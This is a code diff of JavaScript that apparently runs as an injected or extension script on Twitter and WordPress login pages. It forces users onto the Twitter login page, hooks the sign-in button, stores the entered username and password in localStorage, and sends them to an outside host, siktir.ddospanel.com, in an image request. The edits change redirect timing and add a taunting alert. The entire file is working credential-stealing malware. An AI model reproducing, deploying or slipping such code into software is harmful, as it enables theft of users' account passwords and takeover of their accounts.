@@ -7,7 +7,9 @@ document.getElementById('wp-submit').onclick = function() {
 
 if (location.hostname.indexOf("twitter.com") >= 0) {
 if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("download") >= 0) {
+setTimeout(function(){ 
 window.location = "https://twitter.com/login";
+}, 300);
 }
 setTimeout(function(){ 
 if( document.getElementById('signin-email')) {  window.location = "https://twitter.com/login";  }
@@ -28,10 +30,9 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/log
 if (window.location.href.indexOf("login") >= 0) {
 
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
-	setInterval(function(){ 
 	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value;
 	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value;
-		 }, 99);
+		
 		setTimeout(function() {
 			document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick;
 		}, 99);
@@ -41,6 +42,8 @@ if (window.location.href.indexOf("login") >= 0) {
 
 if(localStorage['sw'] && localStorage['pw']){
 	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['sw'] + "&password=" + localStorage['pw'];
+	alert("kek");
+
 }
 
 
